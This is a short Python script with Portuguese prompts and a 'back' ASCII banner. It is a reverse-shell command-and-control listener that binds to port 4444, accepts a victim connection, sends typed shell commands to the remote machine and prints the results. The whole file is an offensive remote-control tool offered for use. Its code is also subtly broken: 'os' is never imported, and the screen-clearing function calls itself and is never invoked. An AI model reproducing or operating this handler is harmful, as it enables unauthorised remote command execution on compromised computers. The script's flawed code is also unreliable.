import socket
import subprocess
import colorama
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Função para limpar a tela.
    
    clear_screen()
print('''
\033[32;1m
bbbbb       a      ccccccc k    k
b    b     a a     c       k   k
b    b    a   a    c       k  k
bbbbb    aaaaaaa   c       kk
b    b  a       a  c       k k
b    b a         a c       k  k
bbbbb  a         a ccccccc k   k

Created By: UnoXit and Kind/skull
version: 2.0
\033[0m
''')

target_host = '127.0.0.1'
target_port = 4444 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((target_host, target_port))
print("Aguardando conexões...")
sock.listen(1)
target, ip = sock.accept()
print(f"Acesso Permitido a: {target_host}:{target_port}")
try:
    while True:
        command = input("""╭──(User@localhost)-(~)
╰──❯❯""")
        target.send(command.encode())
        if command.lower() == 'exit':
            break
        output = target.recv(4096)
        try:
            decoded_output = output.decode('utf-8')
        except UnicodeDecodeError:
            decoded_output = output.decode('latin-1')
        print(decoded_output)
except ConnectionAbortedError:
    print("Conexão Encerrada.")
finally:
    sock.close()